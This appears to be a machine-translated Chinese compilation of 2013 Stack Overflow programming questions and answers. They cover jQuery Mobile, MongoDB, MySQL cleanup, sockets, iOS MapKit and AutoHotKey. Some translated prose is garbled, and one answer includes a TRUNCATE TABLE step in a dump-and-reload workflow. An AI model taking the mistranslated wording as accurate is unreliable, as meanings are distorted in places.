    <script src="http://code.jquery.com/mobile/1.2.0/jquery.mobile-1.2.0.min.js"></script>
    </head>
<body>
    <div data-role="page" id="page1">
        <div data-role="content">
            Page 1
            <a data-role="button" href="page2.html">Go to page 2</a>
        </div>
    </div>
</body> 
```

**page2.html**

```
<div data-role="page" id="page2">
    <div data-role="content">
        Page 2
        <a data-role="button" href="page3.html">Go to page 3</a>
    </div>
</div> 
```

**page3.html**

```
<div data-role="page" id="page3">
<div data-role="content">
    Page 3
    <div data-role="fieldcontain">
        <select data-native-menu="false" multiple="multiple">
           <option>Open Multi-select</option>
           <option value="0">00</option>
           <option value="1">01</option>
           <option value="2">02</option>
           <option value="3">03</option>
           <option value="4">04</option>
           <option value="5">05</option>
           <option value="6">06</option>
           <option value="7">07</option>
           <option value="8">08</option>
           <option value="9">09</option>
           <option value="10">10</option>
           <option value="11">11</option>
           <option value="12">12</option>
           <option value="13">13</option>
           <option value="14">14</option>
           <option value="15">15</option>
           <option value="16">16</option>
           <option value="17">17</option>
           <option value="18">18</option>
           <option value="19">19</option>
           <option value="20">20</option>
           <option value="21">21</option>
           <option value="22">22</option>
           <option value="23">23</option>
           <option value="24">24</option>
           <option value="25">25</option>
           <option value="26">26</option>
           <option value="27">27</option>
           <option value="28">28</option>
           <option value="29">29</option>
           <option value="30">30</option>
           <option value="31">31</option>
           <option value="32">32</option>
           <option value="33">33</option>
           <option value="34">34</option>
           <option value="35">35</option>
           <option value="36">36</option>
           <option value="37">37</option>
           <option value="38">38</option>
           <option value="39">39</option>
           <option value="40">40</option>
           <option value="41">41</option>
           <option value="42">42</option>
           <option value="43">43</option>
           <option value="44">44</option>
           <option value="45">45</option>
           <option value="46">46</option>
           <option value="47">47</option>
           <option value="48">48</option>
           <option value="49">49</option>
           <option value="50">50</option>
           <option value="51">51</option>
           <option value="52">52</option>
           <option value="53">53</option>
           <option value="54">54</option>
           <option value="55">55</option>
           <option value="56">56</option>
           <option value="57">57</option>
           <option value="58">58</option>
           <option value="59">59</option>
       </select>
   </div>
   Once closed, press browser back button
</div> 
```

出于某种原因，在处理单页模板时，pb 是不可重现的。这是[jsfiddle](http://jsfiddle.net/gyw27/)

在此先感谢您的帮助！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-04T18:23:49.560

JQuery Mobile 1.3.0 不再重现该问题：

```
<head>
<link rel="stylesheet" href="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.css" />
<script src="http://code.jquery.com/jquery-1.8.2.min.js"></script>
<script src="http://code.jquery.com/mobile/1.3.0/jquery.mobile-1.3.0.min.js"></script>
</head> 
```

# javascript - jQuery：在中心位置跟踪多个事件

> ID：14916035
> 
> 赞同：0
> 
> 时间：2013-02-16T22:54:26.607
> 
> 标签：javascript, jquery

**免责声明：我是一个对 jQuery 知识很少的设计师。我将与 JavaScript 开发人员合作来实现这一点，但需要能够编写我的需求的详细规范。**

我正在寻求开发一个平台，该平台将通过 jQuery 事件 API 跟踪用户行为。事件，例如用户是否“点击”或`tab`“继续”表单字段将被评分，例如“点击”获得**-1**和`tab`获得**2**。

跟踪所有这些事件分数的最佳方法是什么？我最初的想法是一个整数变量，它根据用户行为增加和减少数量。该平台还必须能够：

*   被开发成饼干
*   变量的值（如果这是最好的方法）将告知通过 AJAX 将哪些内容传递到视图状态

我很高兴收到有关如何最好地处理此问题的代码片段和/或书面规范建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-23T05:00:19.330

好吧，如果您需要*能够编写详细的需求规范，请*复制/粘贴您的问题。像这样没关系。

或者通过删除您的问题使其更清楚。如果您正在编写所需的规范，请不要试图回答应该如何完成，而只是询问必须做什么。

> 通过 jQuery 事件 API 跟踪用户行为。事件，例如用户是否“指向并单击”或`tab`“指向正在处理的表单字段”。

您可以添加额外的“项目管理”信息，例如

*   所需日期
*   可访问范围
*   一些 Web 开发很适合为设计师编写，但对开发人员来说毫无用处
*   预算
*   数据图表/数据流
*   输入/输出

# ruby-on-rails - “Mongod”有效，但运行“rails 控制台”会导致“无法连接到位于 127.0.0.1:9100 (Mongo::ConnectionFailure) 的主节点”

> ID：14916039
> 
> 赞同：0
> 
> 时间：2013-02-16T22:54:50.897
> 
> 标签：ruby-on-rails, mongodb, heroku, gem, mongomapper

我对 MongoDB 有疑问。

首先，在运行时`mongod`，然后`mongo`（在另一个终端窗口中），我得到：

```
MongoDB shell version: 2.2.2
connecting to: test
> 
> 
```

然而。当我输入`rails console`我的 Heroku 应用程序终端时，我得到：

```
Failed to connect to a master node at 127.0.0.1:9100 (Mongo::ConnectionFailure)
from /Users/musetr/.rvm/gems/ruby-1.9.3-p327@rails3tutorial2ndEd/gems/mongo-1.6.4/lib/mongo/connection.rb:594:in `setup'
from /Users/musetr/.rvm/gems/ruby-1.9.3-p327@rails3tutorial2ndEd/gems/mongo-1.6.4/lib/mongo/connection.rb:130:in `initialize'
from /Users/mmusetr/.rvm/gems/ruby-1.9.3-p327@rails3tutorial2ndEd/gems/mongo_mapper-0.12.0/lib/mongo_mapper/connection.rb:79:in `new'
from /Users/musetr/.rvm/gems/ruby-1.9.3-p327@rails3tutorial2ndEd/gems/mongo_mapper-0.12.0/lib/mongo_mapper/connection.rb:79:in `connect'
from /Users/musetr/.rvm/gems/ruby-1.9.3-p327@rails3tutorial2ndEd/gems/mongo_mapper-0.12.0/lib/mongo_mapper/connection.rb:89:in `setup' 
```

.. 任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-21T20:25:03.743

如果没有端口选项，mongod 和 mongo 都使用默认端口号 27017。rails 控制台的输出报告它正在尝试连接到端口 9100。请检查 config/mongo.yml 中的 MongoMapper 配置，与您的环境检查相关变量 RAILS_ENV。

# php - 删除MYSQL表中内容未知的括号

> ID：14916042
> 
> 赞同：0
> 
> 时间：2013-02-16T22:54:59.097
> 
> 标签：php, mysql, database

我有一个带有未知数量的括号数字的大型 MYSQL 表。

例如：“现在地球 [1] 无形和空虚......”

该号码最多可以是 3 位数字。

当我不知道数字是什么时，是否可以编写一个同时删除括号和数字的查询？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:13:29.333

试试这个，希望它可以帮助你：

```
<?php
$str = "Just random [4] stuff with [56] random nums [000]" ;     
$clean = preg_replace("/(\[[0-9]+\])/", "", $str) ;

echo $clean ; //Outputs: Just random  stuff with  random nums
?> 
```

从数据库中获取数据并进行替换。

或者您可以只编写一个脚本来修改您的数据库值：获取标识符和字符串`SELECT`。然后进行更换。使用 . 更新数据库中的表`UPDATE`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:32:18.573

如果这是一次性的事情，您可以执行以下操作：

*   将您的表转储到文件中`mysqldump -u user -p dbname --no-create-info mytable > /tmp/mytabledump.sql`
*   用`sed`做你的替代品`sed -e 's/\[\([0-9]*\)\]//g' mytabledump.sql > mytableclean.sql`
*   截断你的表`mysql -u user -p dbname -e "TRUNCATE TABLE mytable;"`
*   导入数据`mysql -u user -p dbname < /tmp/mytableclean.sql`

您可能需要稍微调整一下正则表达式。

# python - 从字符串中提取正则表达式

> ID：14916047
> 
> 赞同：0
> 
> 时间：2013-02-16T22:55:55.833
> 
> 标签：python

是，有更好的方法来提取字符串：

```
 'Found 1 items\ndrwxr-xr-x   - hadoop supergroup          0 2013-02-16 13:21 /user/hadoop/wiki\n' 
```

所有的字符串都会像：

```
 'Found **n** items\n**permissions**   - **username** **group**          **notsurewhatthisis** **date** **time** **folders(or file)**\n' 
```

现在..我将其拆分为：

```
line = line.split()
num_items = int(line[1])
permissions = line[3] 
```

ETC..

所以基本上这是一个简单的解决方案..

试图看看是否有一种“python”方式来做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-16T23:04:19.470

```
ss = ('Found 1 items\n'
      "drwxr-xr-x   - hadoop supergroup          "
      '0 2013-02-16 13:21 /user/hadoop/wiki\n')

('Found **n** items\n'
 '**permissions**   - **username** **group**          '
 '**notsurewhatthisis** **date** **time** **folders(or file)**\n')

import re

r = re.compile('Found +(\d+) +items *\n *(.+?) *- ')

print r.search(ss).groups() 
```

`ss`is a string
`'Found +(\d+) +items *\n *(.+?) *- '`是用作创建正则表达式的模式的字符串 object
`r`是正则表达式，不是字符串的对象

# drupal - drupal 7：水平显示书籍模块导航

> ID：14916052
> 
> 赞同：0
> 
> 时间：2013-02-16T22:56:23.100
> 
> 标签：drupal, menu, drupal-7

我正在使用图书模块导航块来显示图书页面的链接。我想知道是否有可能改变它，而不是出现在父级下方的子链接，它们会出现在一边。这是因为我想要一个水平导航：

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-18T19:35:31.580

[您可以使用book-navigation.tpl.php 模板](http://api.drupal.org/api/drupal/modules!book!book-navigation.tpl.php/7)自定义导航块。您可以从该模板完全控制该块中的 HTML。它基本上允许下一个、上一个和父元素的链接，以及显示任何子元素的链接列表。如果您想创建更复杂的导航形式（例如：在图书层次结构的当前级别为每个页面提供幻灯片的 javascript 驱动的幻灯片），您将不得不求助于自定义视图并找到[嵌入的方法它](http://api.drupal.org/api/views/views.module/function/views_embed_view/7)在导航模板中。

# hyperlink - 如何从 youtube 获取视频下载链接？

> ID：14916053
> 
> 赞同：1
> 
> 时间：2013-02-16T22:56:24.420
> 
> 标签：hyperlink, youtube, download

我四处寻找，一无所获。好的，这并不完全正确，实际上互联网上有大量的解决方案（甚至在 stackoverflow 上）关于如何获取 youtube 视频的下载链接，但没有一个解决方案不再有效，因为 youtube 似乎保持一直在改变事物。

我想要做的是编写一个 PHP 脚本，它能够从指定的 youtube 页面下载视频，然后以 flv 或 mp4 格式将其保存在服务器上。

我可以通过下载获得一些视频信息：[http ://www.youtube.com/get_video_info?&video_id=VIDEO_ID](http://www.youtube.com/get_video_info?&video_id=VIDEO_ID)

但这就是它，无论我做什么，我都无法弄清楚如何找到指向视频下载的链接。

我尝试使用此链接：http: [//youtube.com/get_video](http://youtube.com/get_video?video_id=VIDEO_ID&t=TOKEN&fmt=18&asv=2) ?video_id=VIDEO_ID&t=TOKEN&fmt=18&asv=2来自我发现的一个更新的解决方案，但要么其中缺少某些东西，要么它已经完全过时了。

那么我怎样才能从 youtube 中挖掘出一些用于直接下载视频的工作链接呢？

必须有某种方法来做到这一点，因为那里有一些提供此服务的网页。

感谢您的任何建议。

* * *

## 回答 #1

> 赞同：-4
> 
> 时间：2013-02-20T17:33:05.340

我更喜欢 RealPlayer 从 youtube 和其他视频共享网站（如 metacafe、funnyordie 等）下载视频。您可以下载 mp4 或 flv 格式，保存它们，并随时查看它们。即使您不在线，这非常适合旅行。[http://www.real.com/realdownloader](http://www.real.com/realdownloader)

# javascript - 图像缩略图未加载并且鼠标悬停在图像上悬停时我的图像向上移动？

> ID：14916054
> 
> 赞同：0
> 
> 时间：2013-02-16T22:56:32.253
> 
> 标签：javascript, html

?我上传测试的网站有问题。当它们在 Dreamweaver cs6 中本地检查时，它们都可以正常工作，但是在上传它们时，它们会执行此操作，滚动图像您会看到问题，当将鼠标悬停在德克萨斯长角牛图像上时出现问题并且密歇根州图像没有加载任何人看到我的错误。

这是重要的代码感谢您的帮助以及指向网站页面的链接[http://odintest.co.nf/product_select.html](http://odintest.co.nf/product_select.html)

```
 <script type="text/javascript">
    function changeImage(a) {
        document.getElementById("img").src=a;
    }
    </script>
<div id="main_img">
    <img id="img" src="images/placeholder.jpg"/>
</div>
   <div id="thumb_img">
    <img src='images/notredamelogo.JPG' width="200" height="150"       onmouseover='changeImage("images/notredame.JPG");'>
    <img src="images/ohiostatelogo.jpg"  onmouseover='changeImage("images/ohiostate.jpg");'>
    <a href="product_display_michigan.html"><img src='images/michiganstatelogo.jpg'  onmouseover='changeImage("images/michiganstate.jpg");'></a>
    <a href="product_display_template.html"><img src='images/floridagatorslogo.jpg'  onmouseover='changeImage("images/floridagators.jpg");'></a>
    <a href="index.html"><img src='images/texaslonghornslogo.jpg'  onmouseover='changeImage("images/texaslonghorns.jpg");'></a>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:12:33.090

好吧，我看到了 2 个问题。

1.  对我来说，“notredamelogo.JPG”没有加载。可能是因为“JPG”。改用“jpg”。
2.  无法为 texaslonghorns 加载主图像。这可能是因为该目录中不存在该图像和/或图像名称或扩展名不正确。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-16T23:05:57.343

1.  我不知道你在描述什么问题，但我猜是悬停延迟。使用 javascript 预加载器或将它们加载到具有沿线样式的 div 中，`{position: absolute; left: -999em;}`以使它们远离屏幕。这使得图像在悬停时立即可用，通常您会在下载它们时看到延迟。

2.  服务器上似乎不存在[http://odintest.co.nf/images/texaslonghorns.jpg](http://odintest.co.nf/images/texaslonghorns.jpg)上的图像。

# sockets - 将套接字从 C# 发送到 iOS 应用程序

> ID：14916058
> 
> 赞同：0
> 
> 时间：2013-02-16T22:57:33.373
> 
> 标签：sockets, asyncsocket

我在将字符串从 C# 应用程序发送到 iOS 应用程序时遇到一些问题。我尝试使用来自 C# 的套接字将数据发送到 SocketTest 并接收，我已经使用套接字从 Socktest 将数据发送到我的 iOS 应用程序，一切顺利！问题是当我尝试使用套接字从 C# 向 iOS 发送数据时......它连接和断开但不发送消息（或者我的 iOS 不读取它......）

要在 C# 中使用套接字发送数据，我正在使用：

```
Socket soc = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
System.Net.IPAddress ipAdd = System.Net.IPAddress.Parse("192.168.0.10");
System.Net.IPEndPoint remoteEP = new IPEndPoint(ipAdd, 2525);
soc.Connect(remoteEP);
byte[] byData = System.Text.Encoding.ASCII.GetBytes("TESTESTTES");
soc.Send(byData);
soc.Disconnect(false); 
```

为了在 iOS 上接收它，我使用了 AsyncSocket 库（我认为这是要发布的相关代码）：

```
-(void)onSocket:(AsyncSocket *)sock didConnectToHost:(NSString *)host port:(UInt16)port
{
    [self logInfo:FORMAT(@"Accepted client %@:%hu", host, port)];   
    NSString *welcomeMsg = @"Welcome to the AsyncSocket Echo Server\r\n";
    NSData *welcomeData = [welcomeMsg dataUsingEncoding:NSUTF8StringEncoding];
    [sock writeData:welcomeData withTimeout:-1 tag:WELCOME_MSG];
    [sock readDataToData:[AsyncSocket CRLFData] withTimeout:READ_TIMEOUT tag:0];
}

- (void)onSocket:(AsyncSocket *)sock didWriteDataWithTag:(long)tag
{
    if(tag == ECHO_MSG)
    {
    [sock readDataToData:[AsyncSocket CRLFData] withTimeout:READ_TIMEOUT tag:0    ];
    }
} 
```

有人可以帮我吗？也许我以错误的方式发送数据？除了 ASCII 之外，我还尝试了其他编码，但没有成功。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-19T11:49:09.740

I've managed to do it! It seems that all was going smoothly but I've forgot one detail: On the iOS side I was expecting some CRLF data that I wasn't sending! I've corrected it simply by adding "\r\n" to string that I encode before sending. :)

# java - 通过套接字发送图片（Java PC - Android）

> ID：14916060
> 
> 赞同：1
> 
> 时间：2013-02-16T22:57:54.453
> 
> 标签：java, android, image, sockets

我是 Java 新手，所以我需要帮助。我正在编写一个应用程序，它将 onClick 向服务器发送一个字符串，服务器需要使用套接字返回一个图像。所以我的客户端是Android，服务器端是PC - java。我认为我的服务器端没问题（因为他打印出了所有 system.out.print 命令）但我的客户端不好。请告诉我我的错误在哪里？谢谢！

这是我的服务器（PC）端的代码（通过函数参数传递套接字）：

```
 try {
        dataInputStream = new DataInputStream(socket.getInputStream());
        poruka = "" + dataInputStream.readUTF();
        System.out.print(poruka);

        int bytecount = 2048;
        byte[] buf = new byte[bytecount];

        OutputStream OUT = socket.getOutputStream();
        BufferedOutputStream BuffOUT = new BufferedOutputStream(OUT, bytecount);
        FileInputStream in = new FileInputStream("screenShot.jpg");

        int i = 0;
        while ((i = in.read(buf, 0, bytecount)) != -1) {
            BuffOUT.write(buf, 0, i);
            System.out.print("check" + buf[0]);
            BuffOUT.flush();
        }

        in.close();
        BuffOUT.close();
        System.out.print("over");

    } catch (IOException e) {
        e.printStackTrace();
    }finally{
        try {
            socket.close();
            dataInputStream.close();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    } 
```

这是我的客户端（Android）端：

```
 Socket socket = null;
            DataOutputStream dataOutputStream = null;

            try {
                socket = new Socket(IPadresa, 8888);
                dataOutputStream = new DataOutputStream(socket.getOutputStream());
                slanje = "hy string";
                dataOutputStream.writeUTF(slanje);

                FileOutputStream outToFile = new FileOutputStream("slika.jpg");

                int bytecount = 2048;
                byte[] buf = new byte[bytecount];

                InputStream IN = socket.getInputStream();
                BufferedInputStream BuffIN = new BufferedInputStream(IN, bytecount)

                int i = 0;
                int filelength = 0;       
                while((i = BuffIN.read(buf, 0, bytecount)) != -1) {
                    filelength += i;
                    outToFile.write(buf, 0, i);
                    outToFile.flush();
                }

                IN.close();
                BuffIN.close();

                dataOutputStream.close();
                socket.close();

            } catch (UnknownHostException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } 
```

更多信息：在服务器端，我可以看到从客户端发送的字符串。我有那个 System.out.print("over"); 每次我将字符串发送到服务器时都会打印命令。我也有 System.out.print("check" + buf[0]); 多次从服务器打印出来。所以这就是为什么我认为客户端有问题。

而且我的客户端没有抛出任何异常......但我注意到客户端从未通过while循环。它卡在那里。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:14:07.630

我不知道您所说的“我的客户端不好”是什么意思，而且我看不出有任何明显的错误会阻止它完全工作。如果你能告诉我们发生了什么，那将有所帮助。

同时，您提供的代码存在一些问题：

1.  您使用“BuffIn”、“IN”、“IPaddresa”等名称违反了行业公认的编码标准。Java 中的所有变量名都必须以小写字母开头。

    如果您在私人代码中执行此操作，那是您的业务。但是如果你要向其他人展示你的 Java 代码，你应该遵守标准。（并且在 SO 上发布您的代码正在向其他人展示它......）

2.  由于您总是试图读取整个缓冲区的数据，请替换`in.read(buf, 0, bytecount)`为`in.read(buf)`.

3.  使用 a 没有任何价值，`BufferedInputStream`或者`BufferedOutputStream`如果你只打算*做大* `read`或`write`调用它。`byte[]`如果你告诉流使用与你正在读/写的相同大小的缓冲区，更是如此。

4.  您的客户端和服务器端代码都可能泄漏文件描述符。在服务器端它可能会泄漏`in`。在客户端，任何或所有流的文件描述符都可能泄漏。

# asp.net - 用vb将字符串解析为方程

> ID：14916062
> 
> 赞同：1
> 
> 时间：2013-02-16T22:57:59.940
> 
> 标签：asp.net, vb.net, string, visual-studio, parsing

有没有办法解析字符串中的运算符以在方程式中使用？

示例：“5 + 4”

在这种情况下，5 和 4 是字符串，但我可以使用 for 循环将它们解析为整数，对吧？但是 + 运算符呢？

好的，我使用了 ChrisF 的解决方案

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T01:15:10.203

The poster seems to have solved his problem, but just in case someone finds this post looking for an answer I have made a very simple solution.

```
 Dim s As String = "5 * 4" 'our equation
        s = s.Replace(" ", "") 'remove spaces
        Dim iTemp As Double = 0 'double (in case decimal) for our calculations
        For i As Integer = 0 To s.Length - 1 'standard loop
            If IsNumeric(s(i)) Then
                iTemp = Convert.ToInt32(s(i)) - 48 'offset by 48 since it gets ascii value when converted
            Else
                Select Case s(i)
                    Case "+"
                        'note s(i+1) looks 1 index ahead
                        iTemp = iTemp + (Convert.ToInt32(s(i + 1)) - 48)'solution
                    Case "-"
                        iTemp = iTemp - (Convert.ToInt32(s(i + 1)) - 48)'solution
                    Case "*"
                        iTemp = iTemp * (Convert.ToInt32(s(i + 1)) - 48)'solution
                    Case "/"
                        'you should check for zero since x/0 = undefined
                        iTemp = iTemp / (Convert.ToInt32(s(i + 1)) - 48)'solution
                End Select
                Exit For 'exit since we are done
            End If
        Next
        MsgBox(iTemp.ToString) 
```

This is just a simple quick and dirty solution. The way I learned in school (many many moons ago) was to do these types of problems with stacks. Complex mathematical strings can be parsed using stacks.

# iphone - iPhone：停止程序在后台运行

> ID：14916066
> 
> 赞同：0
> 
> 时间：2013-02-16T22:58:25.930
> 
> 标签：iphone, ios, objective-c, xcode, mapkit

现在，我有一个带有单个地图视图的应用程序。一旦我点击主页按钮，我应该怎么做才能阻止应用程序检索新的位置更新。我的目标是使电池符号旁边的箭头在主菜单页面上消失。当用户将其带回前台时，该应用程序将再次启动。这是我到目前为止所拥有的，但它不起作用。

```
- (void)applicationDidEnterBackground:(UIApplication *)application
{
    exit(0);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-16T23:00:47.130

1.  你所拥有的应该可以工作（事实上，我曾经为了调试目的使用过它）。

2.  但是，您不应该这样做，尽管它确实有效。只需将应用程序文件中的`UIApplicationExitsOnSuspend`密钥设置为.`Info.plist``true`

# javascript - 按类名单击对象

> ID：14916067
> 
> 赞同：1
> 
> 时间：2013-02-16T22:58:44.500
> 
> 标签：javascript, jquery

我正在尝试`document.getElementsByClassName('classname').click();`，但它不会触发类的点击。这是为什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-16T23:00:50.143

> 这是为什么？

因为该`getElementsByClassName`方法返回一个 DOM 元素数组。在数组上调用 click 方法几乎没有意义。如果你想调用这个 click 方法，你可以在数组的某个特定元素上执行此操作。例如，如果您想在第一个元素上调用它（当然假设数组不为空）：

```
document.getElementsByClassName('classname')[0].click(); 
```

但既然你已经用 jQuery 标记了你的问题，你可能只想写：

```
$('.classname').click(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-16T23:01:08.163

因为这将返回一组元素，通常是一个`HTMLCollection`. 然后你必须遍历它：

[https://developer.mozilla.org/en-US/docs/DOM/document.getElementsByClassName](https://developer.mozilla.org/en-US/docs/DOM/document.getElementsByClassName)

纯Javascript：

```
var elements = document.getElementsByClassName('xxx');

for(var i = 0; i < elements.length; i++)
{
    elements[i].addEventListener('click',function(){window.alert('Class name is xxx');},false);
} 
```

查询：

```
$(document).ready(function(){
    $('.xxx').on('click',function(){window.alert('Class name is xxx');});
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-16T23:01:09.027

`document.getElementsByClassName('classname')`返回一个 DOM 节点数组。

尝试：

```
var nodes = document.getElementsByClassName('classname');
for(var i = 0; i < nodes.length; i++) {
     nodes[i].click();
} 
```

另请记住，`getElementsByClassName`并非每个浏览器都支持。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-16T23:01:41.650

试试这个：

```
$(function() {
  $('.classname').click();
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-16T23:01:48.267

您的代码将与

```
document.getElementsByClassName('classname')[0].click(); 
```

但是，如果你使用 jquery 那么

```
 $(document).ready( function(){
       $('.classname').on('click',function(event){});
    }); 
```

或者干脆`$('.classname').click();`

# android - 如果 Android 标准闹钟应用响起 - 那么

> ID：14916073
> 
> 赞同：1
> 
> 时间：2013-02-16T22:59:18.370
> 
> 标签：android, broadcastreceiver, alarmmanager, intentfilter, android-alarms

如果标准应用程序发出警报，我是否可以收到 Intent？

所以 - 我把闹钟定在晚上 8 点。现在是晚上 8 点，所以我的电话响了。我看到典型的 X 或 zzZ 按钮。
现在我的应用程序应该为我做点什么。

我知道理论上我可以检查当前的警报并检查下一个警报何时到期并发送待处理的意图。然后我将不得不管理警报的编辑。
有任何想法吗？万分感谢。
亚历克斯

# flash - 将鼠标锁定到应用程序的中心

> ID：14916078
> 
> 赞同：0
> 
> 时间：2013-02-16T23:00:05.860
> 
> 标签：flash, mouse, autohotkey

我在 Flash (actionscript 2.0) 中创建了一个游戏，它需要将鼠标锁定在屏幕中央（就像第一人称射击游戏一样）。在带有 Flash 11.2 的 AS3 中可以做到这一点，但在 AS2 中则不行。使用 AutoHotKey，我可以使用以下代码执行此操作：

```
while (0=0){
    MouseMove, 410, 302, 90 
    sleep 100
}

Esc::ExitApp 
```

这很好用，但我不想为我的用户要求 AutoHotKey。有没有办法将该脚本转换为独立的应用程序（.exe），或者用另一种语言创建这个程序？（Flash 游戏不会从网络上启动）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T04:44:40.580

> 有没有办法将该脚本转换为独立应用程序（.exe）？

如果你已经正常安装了 AHK，你应该可以右键单击 .ahk 文件并选择“编译脚本”。

如果该选项不存在，您也可以在开始菜单中查找“ahk2exe”编译器，该编译器将生成脚本的 .exe 输出。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T08:22:19.527

`WinGetPos`您可以动态使用和设置 XY 坐标，而不是使用可能在其他屏幕尺寸上表现不同的固定位置。为防止用户使用`Atl`+切换时鼠标“冻结”，`Tab`您可以仅在游戏运行时通过选中 来锁定鼠标`IfWinActive`。我没有选择等待 100 毫秒的循环，而是选择了 100 毫秒的计时器来调用脚本，但使用循环或 while 也可以。

```
SetTitleMatchMode, 2
SetTimer, CheckWin, 100

CheckWin:
{
    IfWinActive, YourAppNameHere ; ONLY runs when Your App is Active
    {
        WinGetPos, XStart, YStart, Width, Height, YourAppNameHere ; Use AHK Window Spy
        XPos:=XStart+(Width/2)
        YPos:=YStart+(Height/2)
        MouseMove, %XPos%, %YPos%, 90 
        Return
    }
}

^F1:: ; Ctrl+F1 to stop the timer based loop
SetTimer, CheckWin, Off
Return 
```

这是另一个解决方案：

```
#SingleInstance Force
#installKeybdHook
#Persistent

Xbutton2:: ; Toggle fix mouse in Center
Confine := !Confine
ClipCursor( Confine, A_ScreenWidth/2, A_ScreenHeight/2, A_ScreenWidth/2, A_ScreenHeight/2 )
Return 

ClipCursor( Confine=True, x1=0 , y1=0, x2=1, y2=1 )
{ 
    VarSetCapacity(R,16,0),  NumPut(x1,&R+0),NumPut(y1,&R+4),NumPut(x2,&R+8),NumPut(y2,&R+12) 
    Return Confine ? DllCall( "ClipCursor", UInt,&R ) : DllCall( "ClipCursor" ) 
} 
```

# ios - 在地图视图的可见矩形内显示 MKMapViewAnnotations

> ID：14916080
> 
> 赞同：9
> 
> 时间：2013-02-16T23:00:17.240
> 
> 标签：ios, map, mkmapview, mapkit, mkannotation

我在路径样式视差表视图标题中显示 MKMapView。要创建效果，mapView 的边界要大于用户可见的区域。我需要设置地图视图区域，以便所有地图的注释都包含在 MKMapView 的可见矩形中。最好的方法是什么？

![可见区域有限的 MKMapView](../Images/ad2906c781fe0bff3d508611dcee123f.png)

**为清楚起见进行编辑：**这是一个用例。mapView 大小为 320 x 380。然而，可见区域由 rect (0.0, 20.0, 320.0, 100.0) 定义。我需要设置区域，以便所有注释都出现在 mapView 的这个矩形中。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-02-25T20:53:30.950

设置地图区域以使所有注释都包含在某个部分中，`MKMapView`可以通过三个步骤完成。输入是`mapView`和`annotationsFrame`。

1.  计算`MKMapRect` `mapRect`包含所有注释的 an。
2.  `mapView.bounds`从和计算填充插图`annotationsFrame`。
3.  调用`-setVisibleMapRect:edgePadding:animated:`地图视图。

下面是一个测试的屏幕截图。红色叠加层显示`annotationsFrame`.

![测试的屏幕截图，显示所有注释都在给定的注释框架内](../Images/e60d26566e7e90537693df4c8971e409.png)

这是代码。**注意**：这是一种简化将其添加到代码中的方法，并且**未针对边缘情况进行测试，**例如传入具有相同坐标的 n 注释，或者注释相距太远以至于地图也必须缩小很多，或者具有跨越地图边缘在 +/-180 度经度的坐标。

```
- (void)zoomAnnotationsOnMapView:(MKMapView *)mapView toFrame:(CGRect)annotationsFrame animated:(BOOL)animated
{
    if (_mapView.annotations.count < 2) return;

    // Step 1: make an MKMapRect that contains all the annotations

    NSArray *annotations = _mapView.annotations;

    id <MKAnnotation> firstAnnotation = [annotations objectAtIndex:0];
    MKMapPoint minPoint = MKMapPointForCoordinate(firstAnnotation.coordinate);
    MKMapPoint maxPoint = minPoint;

    for (id <MKAnnotation> annotation in annotations) {
        MKMapPoint point = MKMapPointForCoordinate(annotation.coordinate);
        if (point.x < minPoint.x) minPoint.x = point.x;
        if (point.y < minPoint.y) minPoint.y = point.y;
        if (point.x > maxPoint.x) maxPoint.x = point.x;
        if (point.y > maxPoint.y) maxPoint.y = point.y;
    }

    MKMapRect mapRect = MKMapRectMake(minPoint.x, minPoint.y, maxPoint.x - minPoint.x, maxPoint.y - minPoint.y);

    // Step 2: Calculate the edge padding

    UIEdgeInsets edgePadding = UIEdgeInsetsMake(
        CGRectGetMinY(annotationsFrame),
        CGRectGetMinX(annotationsFrame),
        CGRectGetMaxY(mapBounds) - CGRectGetMaxY(annotationsFrame),
        CGRectGetMaxX(mapBounds) - CGRectGetMaxX(annotationsFrame)
    );

    // Step 3: Set the map rect

    [mapView setVisibleMapRect:mapRect edgePadding:edgePadding animated:animated];
} 
```

如果你想要一个完美的位置（谁没有），这里有三件事需要考虑：

1.  该代码确保所有坐标都在 中`annotationsFrame`，但注释本身可能在外部。为了防止这种情况，只需使用更多的填充。例如，如果您的注释是 20x20 并且以坐标为中心，则在所有边上再使用 10 个填充。
2.  在 iOS 7 以下，地图并没有缩放到完美的缩放比例，而是缩放到下一个图块大小（2 的幂）。因此，注释周围的空间将超出所需空间，如屏幕截图所示。
3.  在 iOS 7 上，地图视图不仅会完美缩放，还会自动关心状态栏。为了使计算正确，您需要从 iOS 7 的顶部填充中减去状态栏高度。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2016-01-21T10:56:27.853

从 iOS 7.0 开始，这可以通过`showAnnotations`.

迅速：

```
mapView.showAnnotations(mapView.annotations, animated: true) 
```

目标-C：

```
[mapView showAnnotations:mapView.annotations animated:YES]; 
```

上述语句将调整地图视图的可见矩形以显示所有注释。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-22T03:30:08.967

